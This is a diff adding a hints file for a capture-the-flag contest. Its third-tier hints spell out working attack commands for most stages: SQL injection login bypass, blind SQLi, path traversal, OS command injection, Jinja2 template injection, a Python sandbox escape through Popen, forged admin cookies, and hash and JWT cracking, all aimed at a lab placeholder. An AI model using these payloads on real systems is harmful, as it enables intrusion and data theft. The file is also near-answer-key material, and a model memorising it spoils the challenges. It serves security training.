@@ -1,0 +1,94 @@
+# ============================================================
+#  CAPTURE THE PEAK  -  HINTS  (SHIPPED, public-safe)
+# ============================================================
+#  Three tiers per stage. Teams unlock them one at a time; each
+#  unlock drops the stage's score (100 -> 80 -> 65 -> 50).
+#    T1 = cryptic nudge (where to look)
+#    T2 = names the tool + a search term
+#    T3 = ~99% of the answer: the exact command(s) to run
+#  Lab stages (web/pwn): the relay base URL is shown on the
+#  stage page as {LAB}. Substitute it in the commands.
+#  No flags here. Safe to ship.
+# ============================================================
+
+hints:
+  1:
+    - "Four coats of paint now. The outer two are both common ways to pack raw bytes into plain text ... one uses A-Z2-7 only, the other uses A-Z a-z 0-9 +/."
+    - "Peel in this order: Base32, then Base64, then hex, then a letter-rotation. Search: 'base32 decode cli', 'base64 decode cli', 'xxd reverse hex', 'rot13'."
+    - "Run this one line in the terminal:  cat basecamp.txt | grep -v '^#' | base32 -d | base64 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
+  2:
+    - "You will not find it reading one packet at a time. Read the whole conversation as a stream."
+    - "Tool: tshark / Wireshark 'Follow TCP Stream'. Search: 'tshark follow tcp stream http post'."
+    - "Run:  tshark -r ridge.pcap -q -z follow,tcp,ascii,0   ... then read the POST body. The flag is the value that was submitted."
+  3:
+    - "The picture is bait. The camera wrote a note into the file itself when the shot was taken. Read the file's metadata, not the pixels."
+    - "Tool: exiftool. Dump every tag and read the human-written ones (UserComment / Comment). Search: 'exiftool usercomment read'."
+    - "Run:  exiftool -a -u -g1 dropped.jpg   ... the UserComment ends with b64=<blob>. Base64-decode that blob:  echo '<blob>' | base64 -d   (or CyberChef 'From Base64'). That is your flag."
+  4:
+    - "The image is a locked container, not a photo. The key is a word, and a second file at this camp is quietly carrying that word."
+    - "Tools: strings (to read the word out of the quiet file), then steghide (to open the image with it). Search: 'steghide extract passphrase', 'strings command'."
+    - "Run:  strings notes.txt | grep -i pass    to read the passphrase, then:  steghide extract -sf snowfield.jpg -p '<that passphrase>'   and read the extracted file."
+  5:
+    - "The photo looks clean because you are looking at all of it at once. The message lives in a single colour channel on its own."
+    - "Tools: ImageMagick to split the blue channel out, then zbarimg to scan what appears. Search: 'imagemagick separate channel', 'zbarimg decode qr'."
+    - "Run:  convert glacier.png -channel B -separate ch.png && zbarimg ch.png   ... the QR decodes straight to the flag."
+  6:
+    - "The relay politely tells crawlers which door NOT to open. Open that one. Then notice it decides who you are from a cookie it hands you ... and trusts completely."
+    - "Technique: read robots.txt, visit the disallowed path, grab the 'session' cookie it sets, base64-decode it to see the JSON, flip the role to admin, re-encode, resend. Search: 'robots.txt disallow', 'base64 decode cookie', 'curl send cookie'."
+    - "Run  curl {LAB}/robots.txt  for the path. Build the admin cookie: base64-encode the JSON {\"user\":\"x\",\"role\":\"admin\"} (echo -n it, pipe to base64 -w0), then send it: curl -b session=<that-base64> {LAB}/relay/panel  ... the admin panel prints the flag."
+  7:
+    - "The login form drops your input straight into the question it asks its database. Ask a question that is always true."
+    - "Technique: SQL injection auth bypass. Search: 'sql injection login bypass OR 1=1', 'sqli authentication bypass payload'."
+    - "Log in with username:  admin' OR '1'='1' --    (any password), or run:  curl -s {LAB}/relay/login -d \"user=admin' OR '1'='1' -- &pass=x\"   ... the dashboard returns the flag."
+  8:
+    - "The log viewer fetches whatever filename you give it, with no leash. The way up is a lot of steps down and out of its folder."
+    - "Technique: path traversal / LFI. Search: 'lfi path traversal ../', 'directory traversal payload'."
+    - "Run:  curl '{LAB}/relay/logs?file=../../../../etc/peak/flag8'   ... it reads the flag straight off disk."
+  9:
+    - "The diagnostics tool glues your 'host' onto the end of a real shell command and runs it. It never checks where your host ends. End it yourself and tack on your own."
+    - "Technique: OS command injection. Search: 'command injection ; payload', 'os command injection curl'."
+    - "Run:  curl '{LAB}/relay/diag?host=127.0.0.1;cat /etc/peak/.diag_9f2a1c'   ... your command rides along after the ping. (run  ls -a /etc/peak  through the injection first to find that filename.)"
+  10:
+    - "The gatekeeper wants one exact phrase and keeps quiet. But it was compiled in a rush, and rushed binaries leave their secrets lying in plain sight inside them."
+    - "Tools: strings to skim the readable text in the binary, ltrace to watch the comparison it makes. Search: 'strings binary ctf', 'ltrace strcmp password'."
+    - "Run:  ltrace ./gatekeeper    and read the strcmp it does against your input to learn the pass-phrase, then:  ./gatekeeper <that phrase>   ... it prints the flag. (strings ./gatekeeper also leaks it.)"
+  11:
+    - "Old, naked, unsalted hashes. The right plaintext is almost certainly already in the list you were handed."
+    - "Tools: john or hashcat with the bundled wordlist. Search: 'john wordlist crack md5', 'hashcat -m 0 dictionary'."
+    - "Run:  john --format=raw-md5 --wordlist=/opt/peak/wordlists/peak-mini.txt creds.txt    then:  john --show --format=raw-md5 creds.txt   ... the cracked value IS the flag."
+  12:
+    - "The token is signed, but the key that signs it is a weak, guessable word. Recover that word and you can sign tokens the beacon will trust ... including the flag itself."
+    - "Technique: brute the HS256 secret of the JWT. Tools: hashcat mode 16500, or john. Search: 'hashcat 16500 jwt crack', 'jwt weak secret bruteforce'."
+    - "Run:  hashcat -m 16500 --force token.txt /opt/peak/wordlists/peak-mini.txt    (the --force lets it run on CPU). The recovered secret is the inner text of the flag ... wrap it as acqu1redP34k{<secret>}."
+  13:
+    - "The greeter does not just echo your name, it RENDERS it. Hand it a little math in double curly braces and watch what comes back."
+    - "Technique: server-side template injection (Jinja2). First prove it: send a name of {{7*7}} and see if you get 49. Then the engine will happily read the server's own config object for you. Search: 'jinja2 ssti {{7*7}}', 'flask ssti config'."
+    - "Prove it, then read the config:  curl '{LAB}/relay/greet?name={{7*7}}'  (returns 49), then  curl -G '{LAB}/relay/greet' --data-urlencode 'name={{config.FLAG13}}'   ... the greeting comes back with the flag baked in."
+  14:
+    - "Most of the capture is normal DNS. One host keeps querying a domain that never resolves, sending a different gibberish label each time. Those labels are the message."
+    - "Technique: DNS exfiltration. Pull every query name, keep only the ones for that dead domain, drop the domain suffix, and glue the labels together ... they are hex. Tools: tshark, xxd. Search: 'tshark dns.qry.name fields', 'dns exfiltration hex decode'."
+    - "Run:  tshark -r beacon.pcap -T fields -e dns.qry.name 2>/dev/null | grep exfil.peak | sed 's/.exfil.peak//' | tr -d '\\n' | xxd -r -p ; echo   ... the concatenated labels decode straight to the flag."
+  15:
+    - "The notes file at this camp tells you the key is not written down beside the image anymore. Believe it ... and ask where else a single short string could be hiding ON the image itself."
+    - "Technique: the steghide passphrase is in the photo's EXIF metadata, not in any text file. Read the metadata first, then use that string as the passphrase. Tools: exiftool, steghide. Search: 'exiftool read all tags', 'steghide extract passphrase'."
+    - "Run:  exiftool -a -u -g1 summit.jpg   and read the UserComment / Comment ... that string is the passphrase. Then:  steghide extract -sf summit.jpg -p '<that string>'   and read the file it drops."
+  16:
+    - "No built-ins does not mean no escape. Everything in Python is reachable from any object you already hold ... an empty tuple knows its class, its class knows its base, and the base knows every subclass loaded in the process."
+    - "Technique: Python sandbox escape via the object class hierarchy. The relay already imported subprocess, so Popen is one of those subclasses. Find it by name and run a command to read the key file shown on the page. Search: 'python eval sandbox escape __subclasses__ Popen', 'jail escape ().__class__.__base__.__subclasses__()'."
+    - "Send this as the expression (URL-encode it), pointing at the key path the page shows (it is /etc/peak/.box_3d9e7b):  [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0](['cat','/etc/peak/.box_3d9e7b'],stdout=-1).communicate()[0]   ... it returns the file bytes, flag included."
+  17:
+    - "Same game as the unsalted dump earlier, with one twist: there is a salt sitting right beside the hash. It does not make the password harder, it just changes which cracking MODE you pick."
+    - "Technique: salted SHA-256, format hash:salt. The plaintext that falls out is the inner text of the flag. Tools: hashcat mode 1410 (sha256($pass.$salt)), with the bundled wordlist. Search: 'hashcat 1410 salted sha256', 'hashcat hash:salt format'."
+    - "Run:  hashcat -m 1410 shadow.txt /opt/peak/wordlists/peak-mini.txt --force    then read the cracked plaintext ... wrap it as acqu1redP34k{<plaintext>}. (shadow.txt is already in hash:salt form.)"
+  18:
+    - "The vault seals  your_input + SECRET  with AES in ECB mode (same plaintext block -> same ciphertext block, always). That property is the whole bug. Line your input up so the last unknown byte of the secret sits at the end of a block you control."
+    - "This is the classic ECB byte-at-a-time decryption. Hit  {LAB}/relay/vault?p=<your-text>  (returns ciphertext hex). Send blocks that are one byte short, watch which trailing block appears, then brute the single unknown byte by trying all 256. Repeat for the next byte. Search: 'AES ECB byte at a time decryption', 'ecb oracle attack'."
+    - "Block size is 16. Algorithm: for each secret byte, send p = 'A'*(15 - (i % 16)) padded so the target byte lands at a block boundary, record the target ciphertext block, then for b in 0..255 send your known-prefix + b and match the block. Script it against {LAB}/relay/vault?p= ... it spells out the flag. A chatbot can hand you the script but it still has to run hundreds of queries, so just run it."
+  19:
+    - "strings and grep will not hand you the key this time ... it is never stored, it is BUILT at runtime one character at a time from a formula over each character's position. You have to read that formula."
+    - "Reverse it statically: objdump -d keygen (or Ghidra / gdb). Find the loop that compares your argv[1] byte-by-byte against a value computed from the index i. Reproduce that formula in a few lines of Python to generate the exact serial it wants. Search: 'keygenme reversing objdump loop', 'crackme serial algorithm'."
+    - "The check is: valid[i] == 'A' + ((i*7 + 3) % 26), for a 16-character serial (i = 0..15). Generate it:  python3 -c \"print(''.join(chr(ord('A')+((i*7+3)%26)) for i in range(16)))\"  then run  ./keygen <that-serial>  and it prints the flag. (The flag is XOR-obfuscated inside the binary, so it only appears when the serial is right.)"
+  20:
+    - "The lookup only says YES or NO, but your input goes straight into its SQL WHERE clause, and the flag is a row in the very same table. You cannot read it ... but you can ASK about it, one true/false question at a time."
+    - "Boolean blind SQLi. Endpoint:  {LAB}/relay/check?id=1 ... inject a condition that is true only when a character of the secret matches your guess, and tell YES from NO in the response. Search: 'boolean blind sql injection substr', 'blind sqli extract string character by character'."
+    - "Payload shape (sqlite):  {LAB}/relay/check?id=1 AND substr((SELECT note FROM vault WHERE id=1),<pos>,1)=char(<N>)  ... YES means that character's ASCII code is N. Loop <pos> 1..N and the printable codes 32..126, script it, and the secret spells out the flag. It is slow on purpose ... an AI can write the loop but you still have to run every request."
